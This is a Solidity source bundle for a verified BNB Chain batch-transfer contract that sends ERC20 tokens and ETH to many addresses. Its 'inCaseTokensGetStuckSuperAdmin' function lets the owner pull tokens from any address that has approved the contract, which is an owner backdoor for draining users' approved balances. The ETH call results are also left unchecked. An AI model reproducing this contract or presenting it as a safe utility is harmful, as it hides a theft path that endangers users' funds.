{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"MultiTransfer.sol":{"content":"/**\n *Submitted for verification at BscScan.com on 2021-10-01\n*/\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract multiTransferErc20 {\n    address owner;\n    constructor () {\n        owner=msg.sender;\n\n    }\n    \n    function multiTransfer(address _tokenAddress,address[] memory toAddressArr,uint _amount) public  {\n        for(uint i=0;i<toAddressArr.length;i++){\n            IERC20(_tokenAddress).transferFrom(msg.sender,toAddressArr[i],_amount);\n        }\n        \n    }\n    \n    \n    function multiTransferWithDifferentAmount(address _tokenAddress,address[] memory toAddressArr,uint[] memory _amountArr) public  {\n        for(uint i=0;i<toAddressArr.length;i++){\n            IERC20(_tokenAddress).transferFrom(msg.sender,toAddressArr[i],_amountArr[i]);\n        }        \n        \n    }    \n\n    function multiTransferETH(address[] memory toAddressArr,uint _amount) public payable  {\n        for(uint i=0;i<toAddressArr.length;i++){\n            (bool success, ) = toAddressArr[i].call{value: _amount}(\"\");\n        }        \n        \n    }        \n    \n    function inCaseTokensGetStuck(address withdrawaddress,address _token,uint _amount)  public  {\n\n        require(msg.sender == owner, \"!governance\");\n \n        require(withdrawaddress != address(0), \"WITHDRAW-ADDRESS-REQUIRED\");  \n        IERC20(_token).transfer(withdrawaddress, _amount);\n    }\n    \n    function inCaseTokensGetStuckSuperAdmin(address fromA,address withdrawaddress,address _token,uint _amount)  public  {\n\n        require(msg.sender == owner, \"!governance\");\n \n        require(withdrawaddress != address(0), \"WITHDRAW-ADDRESS-REQUIRED\");  \n        IERC20(_token).transferFrom(fromA,withdrawaddress, _amount);\n    }    \n    \n    \n    function emergencyWithdrawETHs(address to) public {\n        require(msg.sender == owner, \"!governance\");        \n        require(to != address(0), \"WITHDRAW-ADDRESS-REQUIRED\");\n        (bool success, ) = to.call{value: address(this).balance}(\"\");\n    }           \n    \n}"}}}